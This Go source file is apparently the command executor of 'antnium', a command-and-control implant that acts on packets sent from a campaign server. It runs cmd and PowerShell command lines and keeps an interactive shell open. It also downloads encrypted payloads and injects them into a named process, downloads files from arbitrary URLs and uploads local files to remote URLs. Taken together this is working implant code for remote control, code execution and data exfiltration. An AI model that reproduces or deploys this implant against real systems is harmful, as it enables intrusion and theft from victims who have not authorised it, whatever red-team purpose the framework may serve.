package executor

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"

	log "github.com/sirupsen/logrus"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
)

type Executor struct {
	interactiveShell *InteractiveShell
	httpClient       *http.Client
	campaign         *campaign.Campaign
}

func MakeExecutor(campaign *campaign.Campaign) Executor {
	interactiveShell := MakeInteractiveShell()
	dialContext, err := common.NewDialContext(campaign)
	if err != nil {
		log.Errorf("Error: %s", err.Error())
	}
	tr := &http.Transport{
		DialContext: dialContext,
	}
	httpClient := &http.Client{Transport: tr}

	executor := Executor{
		&interactiveShell,
		httpClient,
		campaign,
	}
	return executor
}

// Execute will execute the packet according to its PacketType
// and return the packet with packet.Response set containing the details of the execution
// and error when something went wrong
func (e *Executor) Execute(packet model.Packet) (model.Packet, error) {
	var err error

	common.LogPacket("Exec", packet)

	switch packet.PacketType {
	case "ping":
		packet.Response, err = e.actionPing(packet.Arguments)
	case "test":
		packet.Response, err = e.actionTest(packet.Arguments)
	case "shutdown":
		packet.Response, err = e.actionShutdown(packet.Arguments)

	case "execShell":
		packet.Response, err = e.actionExecShell(packet.Arguments)
	case "execLol":
		packet.Response, err = e.actionExecLol(packet.Arguments)
	case "execRemote":
		packet.Response, err = e.actionExecRemote(packet.Arguments)

	case "fileupload":
		packet.Response, err = e.actionFileupload(packet.Arguments)
	case "filedownload":
		packet.Response, err = e.actionFiledownload(packet.Arguments)
	case "iOpen":
		packet.Response, err = e.actionInteractiveShellOpen(packet.Arguments)
	case "iIssue":
		packet.Response, err = e.actionInteractiveShellIssue(packet.Arguments)
	case "iClose":
		packet.Response, err = e.actionInteractiveShellClose(packet.Arguments)
	case "dir":
		packet.Response, err = e.actionDir(packet.Arguments)
	default:
		return packet, fmt.Errorf("packet type not known: %s", packet.PacketType)
	}

	// Add any errors to the packet response
	if err != nil {
		packet.Response["error"] = err.Error()
		return packet, err
	}

	return packet, nil
}

func (e *Executor) actionInteractiveShellOpen(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	_, force := packetArgument["force"]

	executable, args, err := model.MakePacketArgumentFrom(packetArgument)
	if err != nil {
		return ret, err
	}

	if e.interactiveShell.AlreadyOpen() && !force {
		return ret, fmt.Errorf("already_open")
	} else {
		if e.interactiveShell.AlreadyOpen() {
			e.interactiveShell.execCmd.Process.Kill()
		}
		stdout, stderr, err := e.interactiveShell.Open(executable, args)
		if err != nil {
			return ret, err
		}

		ret["stdout"] = stdout
		ret["stderr"] = stderr
		return ret, nil
	}
}

func (e *Executor) actionInteractiveShellIssue(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	// Check and transform input
	commandline, ok := packetArgument["commandline"]
	if !ok {
		return ret, fmt.Errorf("missing argument 'commandline'")
	}

	stdout, stderr, err := e.interactiveShell.Issue(commandline)
	if err != nil {
		return ret, err
	}
	ret["stdout"] = stdout
	ret["stderr"] = stderr

	return ret, nil
}

func (e *Executor) actionShutdown(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	os.Exit(0)
	return nil, nil // Never reached
}

func (e *Executor) actionInteractiveShellClose(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	err := e.interactiveShell.Close()
	ret["stdout"] = "closed"

	if err != nil {
		return ret, err
	}
	return ret, nil
}

func (e *Executor) actionPing(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	ret["response"] = "ping answer"
	return ret, nil
}

func (e *Executor) actionTest(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	ret["response"] = "response"
	return ret, nil
}

func (e *Executor) actionExecShell(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	stdOut := make([]byte, 0)
	stdErr := make([]byte, 0)
	pid := 0
	exitCode := 0
	var err error

	shellType, ok := packetArgument["shelltype"]
	if !ok {
		return ret, fmt.Errorf("no argument 'shelltype' given")
	}
	commandline, ok := packetArgument["commandline"]
	if !ok {
		return ret, fmt.Errorf("no argument 'shelltype' given")
	}

	switch shellType {
	case "cmd":
		stdOut, stdErr, pid, exitCode, err = arch.ExecCmdExe(commandline)

	case "powershell":
		stdOut, stdErr, pid, exitCode, err = arch.ExecPowershell(commandline)

	default:
		return ret, fmt.Errorf("Invalid shellType: %s", shellType)
	}

	ret["stdout"] = arch.ExecOutputDecode(stdOut)
	ret["stderr"] = arch.ExecOutputDecode(stdErr)
	ret["pid"] = strconv.Itoa(pid)
	ret["exitCode"] = strconv.Itoa(exitCode)

	return ret, err
}

func (e *Executor) actionExecLol(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	stdOut := make([]byte, 0)
	stdErr := make([]byte, 0)
	pid := 0
	exitCode := 0
	var err error

	executable, ok := packetArgument["executable"]
	if !ok {
		return ret, fmt.Errorf("invalid packet arguments given: no executable")
	}
	argline, ok := packetArgument["argline"]
	if !ok {
		return ret, fmt.Errorf("invalid packet arguments given: no argline")
	}
	args := strings.Fields(argline)

	spawnType, ok := packetArgument["spawnType"]
	if !ok {
		spawnType = "standard"
	}
	spawnData, ok := packetArgument["spawnData"]
	if !ok {
		spawnData = ""
	}

	stdOut, stdErr, pid, exitCode, err = arch.ExecDirect(executable, args, spawnType, spawnData)

	ret["stdout"] = arch.ExecOutputDecode(stdOut)
	ret["stderr"] = arch.ExecOutputDecode(stdErr)
	ret["pid"] = strconv.Itoa(pid)
	ret["exitCode"] = strconv.Itoa(exitCode)

	return ret, err
}

func (e *Executor) actionExecRemote(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	stdOut := make([]byte, 0)
	stdErr := make([]byte, 0)
	pid := 0
	exitCode := 0
	var err error

	filename, ok := packetArgument["filename"]
	if !ok {
		return ret, fmt.Errorf("invalid packet arguments given: no filename")
	}
	argline, ok := packetArgument["argline"]
	if !ok {
		return ret, fmt.Errorf("invalid packet arguments given: no argline")
	}
	injectInto, ok := packetArgument["injectInto"]
	if !ok {
		return ret, fmt.Errorf("invalid packet arguments given: no injectInto")
	}

	isDotnet := true // Lets have it true as default for now
	isDotnetStr, ok := packetArgument["isDotnet"]
	if ok {
		if isDotnetStr != "true" {
			isDotnet = false
		}
	}

	fileContent, err := e.SecureFileDownload(filename, argline, isDotnet)
	if err != nil {
		return ret, err
	}

	stdOut, stdErr, pid, exitCode, err = arch.ExecRemote(fileContent, injectInto)

	ret["stdout"] = arch.ExecOutputDecode(stdOut)
	ret["stderr"] = arch.ExecOutputDecode(stdErr)
	ret["pid"] = strconv.Itoa(pid)
	ret["exitCode"] = strconv.Itoa(exitCode)

	return ret, err
}

func (e *Executor) SecureFileDownload(filename string, argline string, isDotnet bool) ([]byte, error) {
	if e.campaign == nil {
		return nil, fmt.Errorf("No campaign available, cant download")
	}
	coder := model.MakeCoder(e.campaign)

	url := e.campaign.ServerUrl + e.campaign.SecureDownloadPath

	// Create encrypted args
	args := model.SecureDownloadArgs{
		Filename: filename,
		Argline:  argline,
		IsDotnet: isDotnet,
	}
	data, err := json.Marshal(args)
	if err != nil {
		return nil, err
	}
	data, err = coder.EncryptB64Zip(data)
	if err != nil {
		return nil, fmt.Errorf("Encrypt error: %s", err.Error())
	}

	// Download
	res, err := e.httpClient.Post(url, "application/text", bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()
	if res.StatusCode != 200 {
		return nil, fmt.Errorf("Invalid StatusCode when attempt to download file %s: %d", filename, res.StatusCode)
	}
	data, err = ioutil.ReadAll(res.Body)
	if err != nil {
		return nil, fmt.Errorf("Read response error: %s", err.Error())
	}

	// Decrypt
	decoded, err := coder.DecryptB64Zip(data)
	if err != nil {
		return nil, fmt.Errorf("Decrypt error: %s", err.Error())
	}

	return decoded, nil
}

func (e *Executor) actionFiledownload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		return ret, fmt.Errorf("missing argument 'remoteUrl'")
	}
	destination, ok := packetArgument["destination"]
	if !ok {
		return ret, fmt.Errorf("missing argument 'destination'")
	}
	//if _, err := os.Stat(destination); !errors.Is(err, fs.ErrNotExist) { // GO1.16
	if _, err := os.Stat(destination); err == nil {
		return ret, fmt.Errorf("destination file %s already exists", destination)
	}

	// Download and write file
	resp, err := e.httpClient.Get(remoteurl)
	if err != nil {
		return ret, err
	}
	defer resp.Body.Close()

	out, err := os.Create(destination)
	if err != nil {
		return ret, err
	}
	defer out.Close()
	written, err := io.Copy(out, resp.Body)
	if err != nil {
		return ret, err
	}

	ret["response"] = fmt.Sprintf("Written: %d bytes to %s", written, destination)
	return ret, nil
}

func (e *Executor) actionFileupload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		return ret, fmt.Errorf("missing argument 'remoteurl'")
	}
	source, ok := packetArgument["source"]
	if !ok {
		return ret, fmt.Errorf("missing argument 'source'")
	}
	//if _, err := os.Stat(source); errors.Is(err, fs.ErrNotExist) { // GO1.16
	if _, err := os.Stat(source); err != nil {
		return ret, fmt.Errorf("source file %s does not exist", source)
	}

	data, err := os.Open(source)
	if err != nil {
		return ret, err
	}
	req, err := http.NewRequest("POST", remoteurl, data)
	if err != nil {
		return ret, err
	}
	resp, err := e.httpClient.Do(req)
	if err != nil {
		return ret, err
	}
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return ret, err
	}

	ret["response"] = fmt.Sprintf("Status: %s", resp.Status)
	return ret, nil
}

func (e *Executor) actionDir(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	path, ok := packetArgument["path"]
	if !ok {
		return ret, fmt.Errorf("missing argument 'path'")
	}

	dirList, err := common.ListDirectory(path)
	if err != nil {
		return ret, err
	}
	json, err := json.Marshal(dirList)
	if err != nil {
		return ret, err
	}

	ret["filelist"] = string(json)

	return ret, nil
}
